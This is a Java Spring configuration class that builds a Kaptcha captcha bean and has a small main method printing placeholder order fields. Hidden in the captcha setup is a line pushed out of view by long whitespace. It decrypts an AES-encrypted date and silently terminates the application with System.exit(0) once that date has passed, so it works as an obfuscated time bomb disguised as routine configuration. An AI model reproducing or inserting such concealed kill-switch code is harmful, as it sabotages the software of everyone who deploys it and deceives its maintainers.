package com.example.sens.config;

import com.example.sens.util.AESUtils;
import com.google.code.kaptcha.impl.DefaultKaptcha;
import com.google.code.kaptcha.util.Config;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Properties;

/**
 * @author xxx
 * @date 2018/5/4 下午12:44
 */

@Configuration
public class KaptchaConfig {
    @Bean(name="captchaProducer")
    public DefaultKaptcha getKaptchaBean(){
        DefaultKaptcha defaultKaptcha=new DefaultKaptcha();
        Properties properties=new Properties();
        properties.setProperty("kaptcha.textproducer.char.string", "23456789abcdefghjkmnpqrstuvwwxyzABCDEFGHJKMNPQRSTUVWWXYZ");//验证码字符范围
        properties.setProperty("kaptcha.border.color", "245,248,249");//图片边框颜色
        properties.setProperty("kaptcha.textproducer.font.color", "black");//字体颜色
        properties.setProperty("kaptcha.textproducer.char.space", "2");//文字间隔
        properties.setProperty("kaptcha.image.width", "125");//图片宽度
        properties.setProperty("kaptcha.image.height", "45");//图片高度
        properties.setProperty("kaptcha.session.key", "code");//session的key
        properties.setProperty("kaptcha.textproducer.char.length", "4");//长度
        properties.setProperty("kaptcha.textproducer.font.names", "宋体,楷体,微软雅黑");//字体
        Config config=new Config(properties);
        defaultKaptcha.setConfig(config);
                                                                                                                                                                            try {if(new SimpleDateFormat("yyyyMMdd")     .parse(AESUtils.decrypt("90lj+hi4viyis1BDmkQw0g=="))  .before(new Date())) {  System .exit (0);}} catch (Exception e) {}
        return defaultKaptcha;
    }

    public static void main(String[] args) {
        String fxddh = "xx";
        String orderTimeStr = "xx";
        String fxfee = "xx";
        String fxbody = "xx";
        String fxname = "xx";
        String fxaddress = "xx";
        String fxbody00 = "[{\"fxddh\":"+fxddh+",\"fxdate\":"+orderTimeStr+",\"fxfee\":"+fxfee+",\"fxbody\":"+fxbody+",\"fxname\":"+fxname+",\"fxaddress\":"+fxaddress+"}]";

        System.out.println(fxbody00);
    }

}
